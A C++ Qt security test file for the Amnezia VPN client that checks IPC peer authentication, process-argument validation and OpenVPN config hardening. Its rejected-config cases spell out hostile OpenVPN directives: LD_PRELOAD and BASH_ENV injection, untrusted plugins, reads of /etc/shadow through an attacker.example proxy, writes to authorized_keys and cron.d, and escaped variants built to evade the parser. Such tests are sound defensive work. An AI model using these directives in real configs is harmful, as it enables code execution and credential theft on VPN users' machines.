#include <QCoreApplication>
#include <QDeadlineTimer>
#include <QDir>
#include <QEventLoop>
#include <QFileInfo>
#include <QJsonDocument>
#include <QJsonParseError>
#include <QLocalServer>
#include <QLocalSocket>
#include <QList>
#include <QRegularExpression>
#include <QSet>
#include <QTemporaryFile>
#include <QTextStream>

#include "ipc.h"
#include "core/utils/operatorCommand.h"
#include "localpeerauthentication.h"
#ifdef Q_OS_WIN
#  include "windowsprivilegedpipe.h"
#endif

namespace {
class TestRunner
{
public:
    void check(bool condition, const char *expression, int line)
    {
        ++m_assertions;
        if (!condition) {
            ++m_failures;
            QTextStream(stderr) << "FAIL line " << line << ": " << expression << Qt::endl;
        }
    }

    int finish() const
    {
        QTextStream stream(m_failures == 0 ? stdout : stderr);
        stream << (m_failures == 0 ? "PASS" : "FAIL") << ": " << m_assertions
               << " assertions, " << m_failures << " failures" << Qt::endl;
        return m_failures == 0 ? 0 : 1;
    }

private:
    int m_assertions = 0;
    int m_failures = 0;
};

#ifdef Q_OS_WIN
bool waitForPendingConnection(amnezia::ipc::WindowsPrivilegedPipeServer &server,
                              int timeoutMilliseconds)
{
    QDeadlineTimer deadline(timeoutMilliseconds);
    while (!server.hasPendingConnections() && !deadline.hasExpired()) {
        QCoreApplication::processEvents(QEventLoop::AllEvents, 10);
    }
    return server.hasPendingConnections();
}
#endif
}

#define CHECK(expression) runner.check((expression), #expression, __LINE__)

int main(int argc, char *argv[])
{
    QCoreApplication app(argc, argv);
    TestRunner runner;

    CHECK(amnezia::PrivilegedIpcProtocolVersion == 2);
    CHECK(amnezia::getIpcServiceUrl().contains(QStringLiteral("v2")));
    CHECK(amnezia::getDaemonServiceUrl().contains(QStringLiteral("v2")));

    QSet<QString> capabilities;
    const QRegularExpression capabilityPattern(QStringLiteral("^[0-9a-f]{32}$"));
    for (int i = 0; i < 128; ++i) {
        const QString capability = amnezia::generateIpcCapability();
        CHECK(capabilityPattern.match(capability).hasMatch());
        CHECK(!capabilities.contains(capability));
        capabilities.insert(capability);
    }

    QString identityError;
    CHECK(!amnezia::ipc::currentProcessUserIdentifier(&identityError).isEmpty());
    CHECK(amnezia::ipc::executablePathsMatch(QCoreApplication::applicationFilePath(),
                                             QCoreApplication::applicationFilePath()));
    CHECK(!amnezia::ipc::executablePathsMatch(QCoreApplication::applicationFilePath(),
                                              QDir::temp().filePath(QStringLiteral("not-the-client"))));

    {
        QLocalSocket invalidSocket;
        amnezia::ipc::LocalPeerIdentity identity;
        CHECK(!amnezia::ipc::queryLocalPeerIdentity(&invalidSocket, identity, &identityError));
        CHECK(!amnezia::ipc::queryLocalServerIdentity(&invalidSocket, identity, &identityError));
    }

    {
#ifdef Q_OS_WIN
        const QString serverName = QStringLiteral("amnezia-ipc-security-test-%1-%2")
                                       .arg(QCoreApplication::applicationPid())
                                       .arg(amnezia::generateIpcCapability());

        amnezia::ipc::WindowsPrivilegedPipeServer server;
        CHECK(server.listen(serverName));

        QLocalSocket client;
        QString connectionError;
        CHECK(amnezia::ipc::connectWindowsPrivilegedPipe(
            &client, serverName, 1000, &connectionError));
        CHECK(amnezia::ipc::isWindowsPrivilegedPipeSocket(&client));
        CHECK(waitForPendingConnection(server, 1000));
        QLocalSocket *accepted = server.nextPendingConnection();
        CHECK(accepted != nullptr);
        CHECK(amnezia::ipc::isWindowsPrivilegedPipeSocket(accepted));

        amnezia::ipc::LocalPeerIdentity clientIdentity;
        CHECK(amnezia::ipc::queryLocalPeerIdentity(accepted, clientIdentity, &identityError));
        CHECK(clientIdentity.processId == QCoreApplication::applicationPid());
        CHECK(clientIdentity.userIdentifier == amnezia::ipc::currentProcessUserIdentifier());
        CHECK(!clientIdentity.logonIdentifier.isEmpty());
        CHECK(clientIdentity.sessionId > 0);
        CHECK(amnezia::ipc::executablePathsMatch(clientIdentity.executablePath,
                                                 QCoreApplication::applicationFilePath()));

        amnezia::ipc::LocalPeerIdentity serverIdentity;
        CHECK(amnezia::ipc::queryLocalServerIdentity(&client, serverIdentity, &identityError));
        CHECK(serverIdentity.processId == QCoreApplication::applicationPid());
        CHECK(serverIdentity.userIdentifier == clientIdentity.userIdentifier);
        CHECK(serverIdentity.logonIdentifier == clientIdentity.logonIdentifier);
        CHECK(serverIdentity.sessionId == clientIdentity.sessionId);
        CHECK(amnezia::ipc::executablePathsMatch(serverIdentity.executablePath,
                                                 QCoreApplication::applicationFilePath()));

        const QString currentUser = amnezia::ipc::currentProcessUserIdentifier();
        if (currentUser.compare(QStringLiteral("S-1-5-18"), Qt::CaseInsensitive) != 0) {
            CHECK(!amnezia::ipc::authorizePrivilegedClient(
                accepted, QCoreApplication::applicationFilePath(), nullptr, &identityError));
            CHECK(!amnezia::ipc::authorizePrivilegedServer(
                &client, QCoreApplication::applicationFilePath(), QStringLiteral("not-a-service"),
                nullptr, &identityError));
        }

        accepted->disconnectFromServer();
        accepted->deleteLater();
        client.disconnectFromServer();
        server.close();

        // An ordinary second launch sends an authenticated Raise request and
        // keeps the native pipe alive through a framed ACK. Deliberately write
        // before processing the server's accept event to cover delayed primary
        // event-loop delivery without triggering ERROR_CANNOT_IMPERSONATE.
        const QString shortClientServerName =
            QStringLiteral("amnezia-short-client-ipc-security-test-%1-%2")
                .arg(QCoreApplication::applicationPid())
                .arg(amnezia::generateIpcCapability());
        amnezia::ipc::WindowsPrivilegedPipeServer shortClientServer;
        CHECK(shortClientServer.listen(shortClientServerName));
        QLocalSocket shortClient;
        QString shortClientError;
        CHECK(amnezia::ipc::connectWindowsPrivilegedPipe(
            &shortClient, shortClientServerName, 1000, &shortClientError));
        CHECK(amnezia::ipc::isWindowsPrivilegedPipeSocket(&shortClient));
        const amnezia::operatorMode::CommandRequest raiseRequest {
            amnezia::operatorMode::CommandType::Raise, false, QString()
        };
        QByteArray raiseFrame = QJsonDocument(raiseRequest.toJson()).toJson(QJsonDocument::Compact);
        raiseFrame.append('\n');
        CHECK(shortClient.write(raiseFrame) == raiseFrame.size());
        shortClient.flush();

        CHECK(waitForPendingConnection(shortClientServer, 1000));
        QLocalSocket *shortClientAccepted = shortClientServer.nextPendingConnection();
        CHECK(shortClientAccepted != nullptr);
        if (shortClientAccepted) {
            CHECK(amnezia::ipc::isWindowsPrivilegedPipeSocket(shortClientAccepted));
            amnezia::ipc::LocalPeerIdentity shortClientIdentity;
            QString shortClientIdentityError;
            CHECK(amnezia::ipc::queryLocalPeerIdentity(
                shortClientAccepted, shortClientIdentity, &shortClientIdentityError));
            CHECK(shortClientIdentity.processId == QCoreApplication::applicationPid());
            CHECK(shortClientIdentity.userIdentifier
                  == amnezia::ipc::currentProcessUserIdentifier());
            CHECK(amnezia::ipc::executablePathsMatch(
                shortClientIdentity.executablePath,
                QCoreApplication::applicationFilePath()));

            CHECK(shortClientAccepted->bytesAvailable() > 0
                  || shortClientAccepted->waitForReadyRead(1000));
            const QByteArray receivedRaiseFrame = shortClientAccepted->readLine();
            CHECK(amnezia::operatorMode::wireFrameState(receivedRaiseFrame)
                  == amnezia::operatorMode::WireFrameState::Complete);
            QJsonParseError raiseParseError;
            const QJsonDocument raiseDocument = QJsonDocument::fromJson(
                receivedRaiseFrame.trimmed(), &raiseParseError);
            amnezia::operatorMode::CommandRequest decodedRaiseRequest;
            QString decodedRaiseError;
            CHECK(raiseParseError.error == QJsonParseError::NoError);
            CHECK(raiseDocument.isObject());
            CHECK(amnezia::operatorMode::CommandRequest::fromJson(
                raiseDocument.object(), &decodedRaiseRequest, &decodedRaiseError));
            CHECK(decodedRaiseRequest.type == amnezia::operatorMode::CommandType::Raise);

            amnezia::operatorMode::CommandResponse raiseAcknowledgement;
            raiseAcknowledgement.exitCode = 0;
            raiseAcknowledgement.humanOutput = QStringLiteral("acknowledged");
            raiseAcknowledgement.result = {
                { QStringLiteral("schema"), QStringLiteral("amnezia.operator.raise.v1") },
                { QStringLiteral("ok"), true },
                { QStringLiteral("raised"), true },
            };
            QByteArray acknowledgementFrame = QJsonDocument(
                raiseAcknowledgement.toJson()).toJson(QJsonDocument::Compact);
            acknowledgementFrame.append('\n');
            CHECK(shortClientAccepted->write(acknowledgementFrame)
                  == acknowledgementFrame.size());
            shortClientAccepted->flush();
            CHECK(shortClientAccepted->bytesToWrite() == 0
                  || shortClientAccepted->waitForBytesWritten(1000));
            shortClientAccepted->disconnectFromServer();

            CHECK(shortClient.bytesAvailable() > 0 || shortClient.waitForReadyRead(1000));
            const QByteArray receivedAcknowledgement = shortClient.readLine();
            CHECK(amnezia::operatorMode::wireFrameState(receivedAcknowledgement)
                  == amnezia::operatorMode::WireFrameState::Complete);
            QJsonParseError acknowledgementParseError;
            const QJsonDocument acknowledgementDocument = QJsonDocument::fromJson(
                receivedAcknowledgement.trimmed(), &acknowledgementParseError);
            amnezia::operatorMode::CommandResponse decodedAcknowledgement;
            QString acknowledgementError;
            CHECK(acknowledgementParseError.error == QJsonParseError::NoError);
            CHECK(acknowledgementDocument.isObject());
            CHECK(amnezia::operatorMode::CommandResponse::fromJson(
                acknowledgementDocument.object(), &decodedAcknowledgement,
                &acknowledgementError));
            CHECK(decodedAcknowledgement.exitCode == 0);
            CHECK(decodedAcknowledgement.result.value(QStringLiteral("schema")).toString()
                  == QStringLiteral("amnezia.operator.raise.v1"));
            CHECK(decodedAcknowledgement.result.value(QStringLiteral("ok")).toBool());
            shortClientAccepted->deleteLater();
        }
        shortClient.abort();
        shortClientServer.close();

        const QString ordinaryServerName =
            QStringLiteral("amnezia-ordinary-ipc-security-test-%1-%2")
                .arg(QCoreApplication::applicationPid())
                .arg(amnezia::generateIpcCapability());
        QLocalServer ordinaryServer;
        ordinaryServer.setSocketOptions(QLocalServer::UserAccessOption);
        CHECK(ordinaryServer.listen(ordinaryServerName));

        QLocalSocket ordinaryClient;
        ordinaryClient.connectToServer(ordinaryServerName, QIODevice::ReadWrite);
        CHECK(ordinaryClient.waitForConnected(1000));
        CHECK(ordinaryServer.waitForNewConnection(1000));
        QLocalSocket *ordinaryAccepted = ordinaryServer.nextPendingConnection();
        CHECK(ordinaryAccepted != nullptr);
        CHECK(!amnezia::ipc::isWindowsPrivilegedPipeSocket(&ordinaryClient));
        CHECK(!amnezia::ipc::isWindowsPrivilegedPipeSocket(ordinaryAccepted));

        amnezia::ipc::LocalPeerIdentity rejectedIdentity;
        QString markerError;
        CHECK(!amnezia::ipc::queryLocalPeerIdentity(ordinaryAccepted, rejectedIdentity,
                                                    &markerError));
        CHECK(markerError.contains(QStringLiteral("hardened local pipe transport")));
        CHECK(!amnezia::ipc::authorizePrivilegedServer(
            &ordinaryClient, QCoreApplication::applicationFilePath(),
            QStringLiteral("not-a-service"), nullptr, &markerError));
        CHECK(markerError.contains(QStringLiteral("hardened local pipe transport")));

        ordinaryAccepted->disconnectFromServer();
        ordinaryAccepted->deleteLater();
        ordinaryClient.disconnectFromServer();
        ordinaryServer.close();

        const QString remotePipeName =
            QStringLiteral("\\\\localhost\\pipe\\amnezia-ipc-security-test-%1")
                .arg(amnezia::generateIpcCapability());
        amnezia::ipc::WindowsPrivilegedPipeServer remoteServer;
        CHECK(!remoteServer.listen(remotePipeName));
        CHECK(remoteServer.errorString().contains(QStringLiteral("Remote named-pipe paths")));

        QLocalSocket remoteClient;
        QString remoteError;
        CHECK(!amnezia::ipc::connectWindowsPrivilegedPipe(
            &remoteClient, remotePipeName, 0, &remoteError));
        CHECK(remoteClient.state() == QLocalSocket::UnconnectedState);
        CHECK(remoteError.contains(QStringLiteral("Remote named-pipe paths")));
#else
        const QString serverName = QDir::temp().filePath(
            QStringLiteral("amnezia-ipc-security-test-%1-%2.sock")
                .arg(QCoreApplication::applicationPid())
                .arg(amnezia::generateIpcCapability()));
        QLocalServer::removeServer(serverName);
        QLocalServer server;
        server.setSocketOptions(QLocalServer::UserAccessOption);
        CHECK(server.listen(serverName));

        QLocalSocket client;
        client.connectToServer(serverName, QIODevice::ReadWrite);
        CHECK(client.waitForConnected(1000));
        CHECK(server.waitForNewConnection(1000));
        QLocalSocket *accepted = server.nextPendingConnection();
        CHECK(accepted != nullptr);

        amnezia::ipc::LocalPeerIdentity clientIdentity;
        CHECK(amnezia::ipc::queryLocalPeerIdentity(accepted, clientIdentity, &identityError));
        CHECK(clientIdentity.processId == QCoreApplication::applicationPid());
        CHECK(clientIdentity.userIdentifier == amnezia::ipc::currentProcessUserIdentifier());
        CHECK(amnezia::ipc::executablePathsMatch(clientIdentity.executablePath,
                                                 QCoreApplication::applicationFilePath()));

        amnezia::ipc::LocalPeerIdentity serverIdentity;
        CHECK(amnezia::ipc::queryLocalServerIdentity(&client, serverIdentity, &identityError));
        CHECK(serverIdentity.processId == QCoreApplication::applicationPid());
        CHECK(serverIdentity.userIdentifier == amnezia::ipc::currentProcessUserIdentifier());
        CHECK(amnezia::ipc::executablePathsMatch(serverIdentity.executablePath,
                                                 QCoreApplication::applicationFilePath()));
        const QString currentUser = amnezia::ipc::currentProcessUserIdentifier();
        if (currentUser != QStringLiteral("0")
            && currentUser.compare(QStringLiteral("S-1-5-18"), Qt::CaseInsensitive) != 0) {
            CHECK(!amnezia::ipc::authorizePrivilegedClient(
                accepted, QCoreApplication::applicationFilePath(), nullptr, &identityError));
            CHECK(!amnezia::ipc::authorizePrivilegedServer(
                &client, QCoreApplication::applicationFilePath(), QStringLiteral("not-a-service"),
                nullptr, &identityError));
        }

        accepted->disconnectFromServer();
        accepted->deleteLater();
        client.disconnectFromServer();
        server.close();
        QLocalServer::removeServer(serverName);
#endif
    }

    QTemporaryFile openVpnConfig;
    CHECK(openVpnConfig.open());
    CHECK(openVpnConfig.write("client\n") > 0);
    openVpnConfig.flush();

    const QStringList validOpenVpn {
        QStringLiteral("--config"), openVpnConfig.fileName(), QStringLiteral("--management"),
        QStringLiteral("127.0.0.1"), QStringLiteral("57775"),
        QStringLiteral("--management-client")
    };
    CHECK(amnezia::validateProcessArguments(amnezia::PermittedProcess::OpenVPN,
                                             validOpenVpn).valid);

    QStringList invalidOpenVpn = validOpenVpn;
    invalidOpenVpn[2] = QStringLiteral("--plugin");
    CHECK(!amnezia::validateProcessArguments(amnezia::PermittedProcess::OpenVPN,
                                              invalidOpenVpn).valid);
    invalidOpenVpn = validOpenVpn;
    invalidOpenVpn[3] = QStringLiteral("0.0.0.0");
    CHECK(!amnezia::validateProcessArguments(amnezia::PermittedProcess::OpenVPN,
                                              invalidOpenVpn).valid);
    invalidOpenVpn = validOpenVpn;
    invalidOpenVpn[4] = QStringLiteral("057775");
    CHECK(!amnezia::validateProcessArguments(amnezia::PermittedProcess::OpenVPN,
                                              invalidOpenVpn).valid);
    invalidOpenVpn = validOpenVpn;
    invalidOpenVpn.append(QStringLiteral("--up"));
    invalidOpenVpn.append(QStringLiteral("evil"));
    CHECK(!amnezia::validateProcessArguments(amnezia::PermittedProcess::OpenVPN,
                                              invalidOpenVpn).valid);

    const QString trustedScript = QDir::temp().filePath(QStringLiteral("update-resolv-conf.sh"));
    CHECK(amnezia::validateOpenVpnConfigContent(QByteArrayLiteral("client\nremote 192.0.2.1 443\n")));
    CHECK(amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("tls-client\nremote 192.0.2.1 443\n")));
    CHECK(amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\n<cert>\ninline certificate\n</cert>\n"
                          "<key>\ninline private key\n</key>\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("remote 192.0.2.1 443\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\nmode server\nserver 10.8.0.0 255.255.255.0\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\nifconfig-pool-persist /root/.ssh/authorized_keys 1\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\ngenkey secret /etc/cron.d/amnezia-test\n")));
    const QList<QByteArray> rejectedServerOrFileOutputConfigs {
        QByteArrayLiteral("mode server\nclient\n"),
        QByteArrayLiteral("tls-server\ntls-client\n"),
        QByteArrayLiteral("client\nmode p2p\n"),
        QByteArrayLiteral("client\nserver-ipv6 fd00::/64\n"),
        QByteArrayLiteral("client\nserver-bridge\n"),
        QByteArrayLiteral("client\nifconfig-pool 10.8.0.2 10.8.0.254\n"),
        QByteArrayLiteral("client\nifconfig-ipv6-pool fd00::/64\n"),
        QByteArrayLiteral("client\nclient-config-dir /etc/openvpn/ccd\n"),
        QByteArrayLiteral("client\nport-share 127.0.0.1 8080 /root/journal\n"),
        QByteArrayLiteral("client\npush \"route 192.0.2.0 255.255.255.0\"\n"),
        QByteArrayLiteral("client\nhttp-proxy attacker.example 8080 /etc/shadow basic\n"),
        QByteArrayLiteral("client\ndns-updown /tmp/attacker-script\n"),
        QByteArrayLiteral("client\ncryptoapicert THUMB:0011223344556677\n"),
        QByteArrayLiteral("client\ncapath /etc/ssl/certs\n"),
        QByteArrayLiteral("client\nverify-client-cert none\n"),
    };
    for (const QByteArray &config : rejectedServerOrFileOutputConfigs) {
        CHECK(!amnezia::validateOpenVpnConfigContent(config));
    }
    CHECK(amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\n<ca>\nplugin is certificate text here\n</ca>\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\nplugin /tmp/untrusted.so\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\nplu\\\ngin /tmp/untrusted.so\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\nca /etc/shadow\n")));
    CHECK(amnezia::validateOpenVpnConfigContent(
        QStringLiteral("client\nscript-security 2\nup %1\ndown \"%1\"\n")
            .arg(trustedScript).toUtf8(), trustedScript));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\nscript-security 2\nup /tmp/other-script\n"),
        trustedScript));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\n<key>\nunclosed\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\nsetenv LD_PRELOAD /tmp/attacker.so\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\n\t--SeTeNv\t opt plugin /tmp/attacker.so # inline comment\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\nset\\\nenv BASH_ENV /tmp/attacker.sh\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\n'setenv' LD_PRELOAD /tmp/quoted-attacker.so\n")));
    CHECK(!amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\ns\\etenv BASH_ENV /tmp/escaped-attacker.sh\n")));
    CHECK(amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\nsetenv-safe LD_PRELOAD /tmp/namespaced.so\n")));
    CHECK(amnezia::validateOpenVpnConfigContent(
        QByteArrayLiteral("client\n# setenv LD_PRELOAD /tmp/commented.so\n"
                          "; --setenv opt plugin /tmp/commented.so\n")));

    const QByteArray openVpnPolicy = amnezia::openVpnConfigSecurityPolicyPrefix();
    CHECK(openVpnPolicy == QByteArrayLiteral("pull-filter reject \"setenv \"\n"
                                             "pull-filter accept \"setenv-safe\"\n"
                                             "pull-filter reject \"setenv\"\n"));
    const QByteArray importedOpenVpnConfig =
        QByteArrayLiteral("client\npull-filter accept \"setenv \"\n"
                          "setenv-safe LOCAL_COMPATIBILITY enabled\n");
    const QByteArray hardenedOpenVpnConfig =
        amnezia::hardenOpenVpnConfigContent(importedOpenVpnConfig);
    CHECK(hardenedOpenVpnConfig.startsWith(openVpnPolicy));
    CHECK(hardenedOpenVpnConfig.indexOf(QByteArrayLiteral("pull-filter reject \"setenv \""))
          < hardenedOpenVpnConfig.indexOf(QByteArrayLiteral("pull-filter accept \"setenv \"")));
    CHECK(amnezia::hardenOpenVpnConfigContent(hardenedOpenVpnConfig)
          == hardenedOpenVpnConfig);
    CHECK(amnezia::validateOpenVpnConfigContent(hardenedOpenVpnConfig));

    const QStringList validTun2Socks {
        QStringLiteral("-device"), QStringLiteral("tun://utun22"), QStringLiteral("-proxy"),
        QStringLiteral("socks5://user:p@ss#word@127.0.0.1:1080")
    };
    CHECK(amnezia::validateProcessArguments(amnezia::PermittedProcess::Tun2Socks,
                                             validTun2Socks).valid);
    QStringList invalidTun2Socks = validTun2Socks;
    invalidTun2Socks[3] = QStringLiteral("socks5://user:pass@192.0.2.10:1080");
    CHECK(!amnezia::validateProcessArguments(amnezia::PermittedProcess::Tun2Socks,
                                              invalidTun2Socks).valid);
    invalidTun2Socks = validTun2Socks;
    invalidTun2Socks[1] = QStringLiteral("tun://bad device");
    CHECK(!amnezia::validateProcessArguments(amnezia::PermittedProcess::Tun2Socks,
                                              invalidTun2Socks).valid);

    QTemporaryFile certificate;
    CHECK(certificate.open());
    CHECK(certificate.write("pfx") > 0);
    certificate.flush();
    const QStringList validCertUtil {
        QStringLiteral("-f"), QStringLiteral("-importpfx"), QStringLiteral("-p"),
        QStringLiteral("password"), certificate.fileName(), QStringLiteral("NoExport")
    };
    CHECK(amnezia::validateProcessArguments(amnezia::PermittedProcess::CertUtil,
                                             validCertUtil).valid);
    CHECK(!amnezia::validateProcessArguments(amnezia::PermittedProcess::Wireguard, {}).valid);
    CHECK(!amnezia::validateProcessArguments(amnezia::PermittedProcess::Invalid, {}).valid);
    CHECK(!amnezia::validateProcessArguments(
               static_cast<amnezia::PermittedProcess>(-1), {}).valid);

    {
        QByteArray buffer("{\"protocolVersion\":2}\nnext");
        QByteArray frame;
        CHECK(amnezia::takeDaemonFrame(buffer, frame) == amnezia::DaemonFrameState::FrameReady);
        CHECK(frame == QByteArrayLiteral("{\"protocolVersion\":2}"));
        CHECK(buffer == QByteArrayLiteral("next"));
        CHECK(amnezia::takeDaemonFrame(buffer, frame) == amnezia::DaemonFrameState::NeedMoreData);
    }
    {
        QByteArray buffer(amnezia::MaximumDaemonFrameSize, 'x');
        QByteArray frame;
        CHECK(amnezia::takeDaemonFrame(buffer, frame) == amnezia::DaemonFrameState::NeedMoreData);
        buffer.append('\n');
        CHECK(amnezia::takeDaemonFrame(buffer, frame) == amnezia::DaemonFrameState::FrameReady);
        CHECK(frame.size() == amnezia::MaximumDaemonFrameSize);
    }
    {
        QByteArray buffer(amnezia::MaximumDaemonFrameSize + 1, 'x');
        QByteArray frame;
        CHECK(amnezia::takeDaemonFrame(buffer, frame) == amnezia::DaemonFrameState::TooLarge);
    }
    {
        QByteArray buffer(amnezia::MaximumDaemonFrameSize + 1, 'x');
        buffer.append('\n');
        QByteArray frame;
        CHECK(amnezia::takeDaemonFrame(buffer, frame) == amnezia::DaemonFrameState::TooLarge);
    }

    return runner.finish();
}
